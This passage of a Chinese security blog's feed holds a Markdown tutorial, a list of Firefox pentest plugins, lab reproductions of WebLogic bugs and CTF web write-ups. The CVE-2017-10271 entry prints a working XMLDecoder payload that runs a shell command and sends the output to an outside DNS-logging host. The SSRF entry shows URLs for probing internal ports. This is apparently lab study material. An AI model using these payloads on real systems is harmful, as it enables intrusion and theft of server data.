title="字体"></a>字体</h1><ul><li><strong>这是加粗的文字</strong></li></ul><p>要加粗的文字左右分别用两个*号包起来</p><ul><li><strong>这是倾斜的文字</strong></li></ul><p>要倾斜的文字左右分别用一个*号包起来</p><ul><li><strong>斜体加粗</strong></li></ul><p>要倾斜和加粗的文字左右分别用三个*号包起来</p><ul><li><strong>删除线</strong></li></ul><p>要加删除线的文字左右分别用两个~~号包起来</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">**这是加粗的文字**</span><br><span class="line">*这是倾斜的文字*`</span><br><span class="line">***这是斜体加粗的文字***</span><br><span class="line">~~这是加删除线的文字~~</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><strong>这是加粗的文字</strong><br><em>这是倾斜的文字</em><br><strong><em>这是斜体加粗的文字</em></strong><br><del>这是加删除线的文字</del></p><h1 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h1><p>在引用的文字前加&gt;即可。引用也可以嵌套，如加两个&gt;&gt;三个&gt;&gt;&gt;<br>n个…<br>貌似可以一直加下去，但没神马卵用</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt;这是引用的内容</span><br><span class="line">&gt;&gt;这是引用的内容</span><br><span class="line">&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;&gt;这是引用的内容</span><br></pre></td></tr></table></figure><p>效果如下：</p><blockquote><p>这是引用的内容</p><blockquote><p>这是引用的内容</p><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><blockquote><p>这是引用的内容</p></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote></blockquote><h1 id="分割线"><a href="#分割线" class="headerlink" title="分割线"></a>分割线</h1><p>三个或者三个以上的 - 或者 * 都可以。</p><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">-</span><br><span class="line">***</span><br><span class="line">*****</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>-</p><hr><hr><p>可以看到，显示效果是一样的。</p><h1 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h1><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">![图片alt](图片地址 &apos;&apos;图片title&apos;&apos;)</span><br><span class="line"></span><br><span class="line">图片alt就是显示在图片下面的文字，相当于对图片内容的解释。</span><br><span class="line">图片title是图片的标题，当鼠标移到图片上时显示的内容。title可加可不加</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">![blockchain](https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/</span><br><span class="line">u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg &quot;区块链&quot;)</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="https://ss0.bdstatic.com/70cFvHSh_Q1YnxGkpoWK1HF6hhy/it/u=702257389,1274025419&amp;fm=27&amp;gp=0.jpg" alt="blockchain" title="区块链"></p><p><strong>上传本地图片直接点击导航栏的图片标志，选择图片即可</strong></p><h1 id="超链接"><a href="#超链接" class="headerlink" title="超链接"></a>超链接</h1><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[超链接名](超链接地址 &quot;超链接title&quot;)</span><br><span class="line">title可加可不加</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[简书](http://jianshu.com)</span><br><span class="line">[百度](http://baidu.com)</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><a href="http://jianshu.com" target="_blank" rel="noopener">简书</a><br><a href="http://baidu.com" target="_blank" rel="noopener">百度</a></p><p>注：Markdown本身语法不支持链接在新页面中打开，貌似简书做了处理，是可以的。别的平台可能就不行了，如果想要在新页面中打开的话可以用html语言的a标签代替。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;超链接地址&quot; target=&quot;_blank&quot;&gt;超链接名&lt;/a&gt;</span><br><span class="line"></span><br><span class="line">示例:</span><br><span class="line">&lt;a href=&quot;https://www.jianshu.com/u/1f5ac0cf6a8b&quot; target=&quot;_blank&quot;&gt;简书&lt;/a&gt;</span><br></pre></td></tr></table></figure><h1 id="列表"><a href="#列表" class="headerlink" title="列表"></a>列表</h1><ul><li><strong>无序列表</strong></li></ul><p>语法：<br>无序列表用 - + * 任何一种都可以</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">- 列表内容</span><br><span class="line">+ 列表内容</span><br><span class="line">* 列表内容</span><br><span class="line">注意：- + * 跟内容之间都要有一个空格</span><br></pre></td></tr></table></figure><p>效果如下：</p><ul><li>列表内容</li></ul><ul><li>列表内容</li></ul><ul><li><p>列表内容</p></li><li><p><strong>有序列表</strong></p></li></ul><p>语法：<br>数字加点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1.列表内容</span><br><span class="line">2.列表内容</span><br><span class="line">3.列表内容</span><br><span class="line"></span><br><span class="line">注意：序号跟内容之间要有空格</span><br></pre></td></tr></table></figure><p>效果如下：</p><p>1.列表内容<br>2.列表内容<br>3.列表内容</p><ul><li><strong>列表嵌套</strong></li></ul><p><strong>上一级和下一级之间敲三个空格即可</strong></p><ul><li><p>一级无序列表内容</p><ul><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ul></li><li><p>一级无序列表内容</p><ol><li>二级有序列表内容</li><li>二级有序列表内容</li><li>二级有序列表内容</li></ol></li></ul><ol><li>一级有序列表内容</li></ol><ul><li>二级无序列表内容</li><li>二级无序列表内容</li><li>二级无序列表内容</li></ul><p>2.一级有序列表内容</p><ol><li>二级有序列表内容</li><li>二级有序列表内容</li><li>二级有序列表内容</li></ol><h1 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h1><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">表头|表头|表头</span><br><span class="line">|:--:|:</span><br><span class="line">内容|内容|内容</span><br><span class="line">内容|内容|内容</span><br><span class="line"></span><br><span class="line">第二行分割表头和内容。</span><br><span class="line">- 有一个就行，为了对齐，多加了几个</span><br><span class="line">文字默认居左</span><br><span class="line">-两边加：表示文字居中</span><br><span class="line">-右边加：表示文字居右</span><br><span class="line">注：原生的语法两边都要用 | 包起来。此处省略</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">姓名|技能|排行</span><br><span class="line">--|:--:|--:</span><br><span class="line">刘备|哭|大哥</span><br><span class="line">关羽|打|二哥</span><br><span class="line">张飞|骂|三弟</span><br></pre></td></tr></table></figure><p>效果如下：</p><table><thead><tr><th>姓名</th><th style="text-align:center">技能</th><th style="text-align:right">排行</th></tr></thead><tbody><tr><td>刘备</td><td style="text-align:center">哭</td><td style="text-align:right">大哥</td></tr><tr><td>关羽</td><td style="text-align:center">打</td><td style="text-align:right">二哥</td></tr><tr><td>张飞</td><td style="text-align:center">骂</td><td style="text-align:right">三弟</td></tr></tbody></table><p>语法：</p><p>单行代码：代码之间分别用一个反引号包起来</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">`代码内容`</span><br></pre></td></tr></table></figure><p>代码块：代码之间分别用三个反引号包起来，且两边的反引号单独占一行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">代码...</span><br><span class="line">代码...</span><br><span class="line">代码...</span><br></pre></td></tr></table></figure><h1 id="流程图"><a href="#流程图" class="headerlink" title="流程图"></a>流程图</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">flow</span><br><span class="line">st=&gt;start: 开始</span><br><span class="line">op=&gt;operation: My Operation</span><br><span class="line">cond=&gt;condition: Yes or No?</span><br><span class="line">e=&gt;end</span><br><span class="line">st-&gt;op-&gt;cond</span><br><span class="line">cond(yes)-&gt;e</span><br><span class="line">cond(no)-&gt;op</span><br><span class="line">&amp;</span><br></pre></td></tr></table></figure><p>效果如下：</p><p><img src="1.png" alt></p><h1 id="为文字添加背景色"><a href="#为文字添加背景色" class="headerlink" title="为文字添加背景色"></a>为文字添加背景色</h1><p>由于 style 标签和标签的 style 属性不被支持，所以这里只能是借助 table, tr, td 等表格标签的 bgcolor 属性来实现背景色。故这里对于文字背景色的设置，只是将那一整行看作一个表格，更改了那个格子的背景色（bgcolor）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;table&gt;&lt;tr&gt;&lt;td bgcolor=yellow&gt;背景色yellow&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><table><tr><td bgcolor="yellow">背景色yellow</td></tr></table><h1 id="更改字体、大小、颜色"><a href="#更改字体、大小、颜色" class="headerlink" title="更改字体、大小、颜色"></a>更改字体、大小、颜色</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;font face=&quot;黑体&quot;&gt;我是黑体字&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;微软雅黑&quot;&gt;我是微软雅黑&lt;;/font&gt;</span><br><span class="line">&lt;font face=&quot;STCAIYUN&quot;&gt;我是华文彩云&lt;/font&gt;</span><br><span class="line">&lt;font color=red&gt;我是红色&lt;/font&gt;</span><br><span class="line">&lt;font color=#008000&gt;我是绿色&lt;/font&gt;</span><br><span class="line">&lt;font color=Blue&gt;我是蓝色&lt;/font&gt;</span><br><span class="line">&lt;font size=5&gt;我是尺寸&lt;/font&gt;</span><br><span class="line">&lt;font face=&quot;黑体&quot; color=green size=5&gt;我是黑体，绿色，尺寸为5&lt;/font&gt;</span><br></pre></td></tr></table></figure><p>效果如下：</p><font face="黑体">我是黑体字</font><br><font face="微软雅黑">我是微软雅黑&lt;;/font&gt;<br><font face="STCAIYUN">我是华文彩云</font><br><font color="red">我是红色</font><br><font color="#008000">我是绿色</font><br><font color="Blue">我是蓝色</font><br><font size="5">我是尺寸</font><br><font face="黑体" color="green" size="5">我是黑体，绿色，尺寸为5</font><p>介绍：仅供技术交流学习探讨，请勿用于非法用途。本文部分资源来源于网络，如有侵权请联系版主删除。</p></font>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Firefox渗透插件—Web渗透必备工具</title>
      <link href="/2018/02/04/Firefox%E6%B8%97%E9%80%8F%E6%8F%92%E4%BB%B6%E2%80%94Web%E6%B8%97%E9%80%8F%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7/"/>
      <url>/2018/02/04/Firefox%E6%B8%97%E9%80%8F%E6%8F%92%E4%BB%B6%E2%80%94Web%E6%B8%97%E9%80%8F%E5%BF%85%E5%A4%87%E5%B7%A5%E5%85%B7/</url>
      
        <content type="html"><![CDATA[<p>工欲善必先利其器，firefox一直是各位渗透师必备的利器，我这里推荐34款firefox渗透测试辅助插件，其中包含渗透测试、信息收集、代理、加密解密等功能。</p><a id="more"></a><p><img src="1.jpg" alt></p><p>1：<font color="#FF0000"> Firebug </font> </p><p>Firefox的 五星级强力推荐插件之一，不许要多解释</p><p>2：<font color="#FF0000"> User Agent Switcher </font> </p><p>改变客户端的User Agent的一款插件</p><p>3：<font color="#FF0000"> Hackbar </font> </p><p>攻城师们的必备工具，提供了SQL注入和XSS攻击，能够快速对字符串进行各种编码。</p><p>4：<font color="#FF0000"> HttpFox </font> </p><p>监测和分析浏览器与web服务器之间的HTTP流量</p><p>5：<font color="#FF0000"> Live HTTP Headers </font> </p><p>即时查看一个网站的HTTP头</p><p>6：<font color="#FF0000"> Tamper Data </font> </p><p>查看和修改HTTP/HTTPS头和POST参数</p><p>7：<font color="#FF0000"> ShowIP </font> </p><p>在状态栏显示当前页的IP地址、主机名、ISP、国家和城市等信息。</p><p>8：<font color="#FF0000"> OSVDB </font> </p><p>开放源码的漏洞数据库检索</p><p>9: <font color="#FF0000"> Packet Storm search plugin </font> </p><p>Packet Storm提供的插件，可以搜索漏洞、工具和exploits等。</p><p>10：<font color="#FF0000"> Offsec Exploit-db Search </font> </p><p>搜索Exploit-db信息</p><p>11：<font color="#FF0000"> Security Focus Vulnerabilities Search Plugin </font> </p><p>在Security Focus上搜索漏洞</p><p>12：<font color="#FF0000"> Cookie Watcher </font> </p><p>在状态栏显示cookie</p><p>13: <font color="#FF0000"> Header Spy </font> </p><p>在状态栏显示HTTP头</p><p>14：<font color="#FF0000"> Groundspeed </font> </p><p>Manipulate the application user interface.</p><p>15：<font color="#FF0000"> CipherFox </font> </p><p>在状态栏显示当前SSL/TLS的加密算法和证书</p><p>16：<font color="#FF0000"> XSS Me </font> </p><p>XSS测试扩展</p><p>17：<font color="#FF0000"> SQL Inject Me </font> </p><p>SQL注入测试扩展</p><p>18：<font color="#FF0000"> Wappalyzer </font> </p><p>查看网站使用的应用程序</p><p>19：<font color="#FF0000"> Poster </font> </p><p>发送与Web服务器交互的HTTP请求，并查看输出结果</p><p>20：<font color="#FF0000"> Javascript Deobfuscator </font> </p><p>显示网页上运行的Javascript代码</p><p>21：<font color="#FF0000"> Modify Headers </font> </p><p>修改HTTP请求头</p><p>22：<font color="#FF0000"> FoxyProxy </font> </p><p>代理工具</p><p>23：<font color="#FF0000"> FlagFox </font> </p><p>可以在地址栏或状态栏上显示出当前网站所在国家的国旗，也有更多的其他功能，如：双击国旗可以实现WOT功能；鼠标中键点击是whois功能。当然用户可以在选项里设置快捷键实现诸如复制IP，维基百科查询等功能。</p><p>24：<font color="#FF0000"> Greasemonkey </font> </p><p>greasemonkey 使你可以向任何网页添加DHTML语句(用户脚本)来改变它们的显示方式。就像CSS可以让你接管网页的样式，而用户脚本(User Script)则可以让你轻易地控制网页设计与交互的任何方面。例如:</p><ul><li>使页面上显示的 URL 都成为可以直接点击进入的链接。 <em> 增强网页实用性，使你经常访问的网站更符合你的习惯。 </em> 绕过网站上经常出现的那些烦人的 Bug。</li></ul><p>25：<font color="#FF0000"> Domain Details </font> </p><p>显示服务器类型、IP地址、域名注册信息等</p><p>26：<font color="#FF0000"> Websecurify </font> </p><p>Websecurify是WEB安全检测软件的Firefox的扩展，可以针对Web应用进行安全评估</p><p>27：<font color="#FF0000"> XSSed Search </font> </p><p>搜索XSSed.Com跨站脚本数据库</p><p>28：<font color="#FF0000"> ViewStatePeeker </font> </p><p>查看asp.net的iewState</p><p>29：<font color="#FF0000"> CryptoFox </font> </p><p>破解MD5、加密/解密工具</p><p>30：<font color="#FF0000"> WorldIP </font> </p><p>显示服务器的IP、地址、PING、Traceroute、RDNS等信息</p><p>31：<font color="#FF0000"> Server Spy </font> </p><p>识别访问的web服务器类型，版本以及IP地址的插件</p><p>32：<font color="#FF0000"> Default Passwords </font> </p><p>搜索CIRT.net默认密码数据库。</p><p>33：<font color="#FF0000"> Snort IDS Rule Search </font> </p><p>搜索Snort的IDS规则，做签名开发的应该很有用。</p><p>34：<font color="#FF0000"> FireCAT </font> </p><p>FireCAT (Firefox Catalog of Auditing exTensions) 是一个收集最有效最有用的应用程序安全审计和风险评估工具的列表(这些工具以Firefox插件形式发布的),FireCAT中没有收集的安全工具类型包 括:fuzzer,代理和应用程序扫描器.</p><p>原文转自：<a href="http://www.91ri.org/4441.html" target="_blank" rel="noopener">http://www.91ri.org/4441.html</a></p>]]></content>
      
      
      <categories>
          
          <category> 软件安装与使用 </category>
          
          <category> Firefox渗透插件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>WebLogic XMLDecoder反序列化漏洞复现</title>
      <link href="/2018/02/03/WebLogic%20XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2018/02/03/WebLogic%20XMLDecoder%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>CVE-2017-10271</p><a id="more"></a><p>Oracle Fusion Middleware中的Oracle WebLogic Server组件的WLS Security子组件存在安全漏洞。使用精心构造的xml数据可能造成任意代码执行，攻击者只需要发送精心构造的 HTTP 请求，就可以拿到目标服务器的权限。攻击者可利用该漏洞控制组件，影响数据的可用性、保密性和完整性。</p><h2 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h2><p>  Oracle WebLogic Server 10.3.6.0.0版本</p><p>  Oracle WebLogic Server 12.1.3.0.0版本</p><p>  Oracle WebLogic Server 12.2.1.1.0版本</p><h1 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h1><h2 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br></pre></td></tr></table></figure><p>编译及启动测试环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>访问 <a href="http://127.0.0.1:7001/wls-wsat/CoordinatorPortType" target="_blank" rel="noopener">http://127.0.0.1:7001/wls-wsat/CoordinatorPortType</a></p><p><img src="1.png" alt></p><p>存在该漏洞组件</p><p>用burpsuite抓包访问</p><p>改包：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</span><br><span class="line">Host: 192.168.30.146:7001</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E; rv:11.0) like Gecko</span><br><span class="line">Accept: */*</span><br><span class="line">Content-Type: text/xml</span><br><span class="line">Accept-Language: zh-cn</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 646</span><br><span class="line"></span><br><span class="line">&lt;soapenv:Envelope xmlns:soapenv=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span>&gt;</span><br><span class="line">  &lt;soapenv:Header&gt;</span><br><span class="line">&lt;work:WorkContext xmlns:work=<span class="string">"http://bea.com/2004/06/soap/workarea/"</span>&gt;</span><br><span class="line">&lt;java version=<span class="string">"1.8.0_131"</span> class=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span><br><span class="line">  &lt;void class=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span><br><span class="line">&lt;array class=<span class="string">"java.lang.String"</span> length=<span class="string">"3"</span>&gt;</span><br><span class="line">  &lt;void index=<span class="string">"0"</span>&gt;</span><br><span class="line">&lt;string&gt;/bin/bash&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">  &lt;void index=<span class="string">"1"</span>&gt;</span><br><span class="line">&lt;string&gt;-c&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">  &lt;void index=<span class="string">"2"</span>&gt;</span><br><span class="line">&lt;string&gt;ping `whoami`.ip.port.eu04a0.ceye.io&lt;/string&gt;</span><br><span class="line">  &lt;/void&gt;</span><br><span class="line">&lt;/array&gt;</span><br><span class="line">  &lt;void method=<span class="string">"start"</span>/&gt;&lt;/void&gt;</span><br><span class="line">&lt;/java&gt;</span><br><span class="line">  &lt;/work:WorkContext&gt;</span><br><span class="line">&lt;/soapenv:Header&gt;</span><br><span class="line">  &lt;soapenv:Body/&gt;</span><br><span class="line">&lt;/soapenv:Envelope&gt;</span><br></pre></td></tr></table></figure><p><img src="3.png" alt></p><p>查看ceye平台的DNS查询记录，发现服务器成功执行whoami命令并将结果拼接到ping命令中执行，用户名成功返回到DNS查询记录中：</p><p><img src="4.png" alt></p><p>ps:</p><p>使用ceye平台查看DNS查询记录<br>网站地址：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ceye.io/profile</span><br></pre></td></tr></table></figure></p><p><img src="2.png" alt></p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
          <category> Weblogic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 序列化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>weblogic ssrf 漏洞复现</title>
      <link href="/2018/02/02/weblogic%20ssrf%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
      <url>/2018/02/02/weblogic%20ssrf%20%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>Weblogic中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。</p><a id="more"></a><h1 id="测试环境搭建"><a href="#测试环境搭建" class="headerlink" title="测试环境搭建"></a>测试环境搭建</h1><h2 id="docker搭建"><a href="#docker搭建" class="headerlink" title="docker搭建"></a>docker搭建</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf</span><br></pre></td></tr></table></figure><p>编译及启动测试环境<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker-compose build</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure></p><p>访问 <a href="http://your-ip:7001/uddiexplorer/，无需登录即可查看" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/，无需登录即可查看</a> uddiexplorer 应用。</p><h1 id="SSRF漏洞测试"><a href="#SSRF漏洞测试" class="headerlink" title="SSRF漏洞测试"></a>SSRF漏洞测试</h1><p>SSRF漏洞存在于 <a href="http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在" target="_blank" rel="noopener">http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp，我们在</a> brupsuite 下测试该漏洞。访问一个可以访问的 IP:PORT，如 <a href="http://127.0.0.1:80" target="_blank" rel="noopener">http://127.0.0.1:80</a></p><p>访问：<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.30.146:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7000/uddi&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure></p><p><img src="1.png" alt></p><p>修改为一个不存在的端口，将会返回could not connect over HTTP to server。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.30.146:7001/uddiexplorer/SearchPublicRegistries.jsp?operator=http://127.0.0.1:7000/uddi&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search</span><br></pre></td></tr></table></figure><p><img src="2.png" alt></p><p>通过错误的不同，即可探测内网状态。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞学习 </category>
          
          <category> Weblogic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>西普实验吧-web</title>
      <link href="/2018/02/01/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7-web/"/>
      <url>/2018/02/01/%E8%A5%BF%E6%99%AE%E5%AE%9E%E9%AA%8C%E5%90%A7-web/</url>
      
        <content type="html"><![CDATA[<p>西普实验吧-web题目学习</p><a id="more"></a><h2 id="看起来有点难"><a href="#看起来有点难" class="headerlink" title="看起来有点难"></a>看起来有点难</h2><p><img src="1-1.png" alt></p><p><img src="1-2.png" alt></p><p>用sqlmap跑一下</p><p>用户密码跑出来就行了。</p><h2 id="猫抓老鼠"><a href="#猫抓老鼠" class="headerlink" title="猫抓老鼠"></a>猫抓老鼠</h2><p><img src="2-1.png" alt></p><p><img src="2-2.png" alt></p><p><img src="2-3.png" alt></p><p>提交即可。</p><h2 id="Forbidden"><a href="#Forbidden" class="headerlink" title="Forbidden"></a>Forbidden</h2><p><img src="3-1.png" alt></p><p><img src="3-2.png" alt></p><p><img src="3-3.png" alt></p><p>总结：<br>zh-CN<br>zh-hk  小写<br>en-gb<br>.NET CLR 9.9<br>IE<br>x-forwarded-for:1.1.1.1</p><h2 id="头有点大"><a href="#头有点大" class="headerlink" title="头有点大"></a>头有点大</h2><p><img src="4-1.png" alt></p><p><img src="4-2.png" alt></p><p><img src="4-3.png" alt></p><h2 id="貌似有点难"><a href="#貌似有点难" class="headerlink" title="貌似有点难"></a>貌似有点难</h2><p><img src="5-1.png" alt></p><p><img src="5-2.png" alt></p><p><img src="5-3.png" alt></p><h2 id="这个看起来有点简单"><a href="#这个看起来有点简单" class="headerlink" title="这个看起来有点简单!"></a>这个看起来有点简单!</h2><p><img src="6-1.png" alt></p><p><img src="6-2.png" alt></p><p>普通的数字型显错注入</p><p><img src="6-3.png" alt></p><h2 id="PHP大法"><a href="#PHP大法" class="headerlink" title="PHP大法"></a>PHP大法</h2><p><img src="7-1.png" alt></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">if</span>(eregi(<span class="string">"hackerDJ"</span>,<span class="variable">$_GET</span>[id])) &#123;</span><br><span class="line">  <span class="built_in">echo</span>(<span class="string">"&lt;p&gt;not allowed!&lt;/p&gt;"</span>);</span><br><span class="line">  <span class="built_in">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_GET</span>[id] = urldecode(<span class="variable">$_GET</span>[id]);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[id] == <span class="string">"hackerDJ"</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;Access granted!&lt;/p&gt;"</span>;</span><br><span class="line">  <span class="built_in">echo</span> <span class="string">"&lt;p&gt;flag: *****************&#125; &lt;/p&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br><span 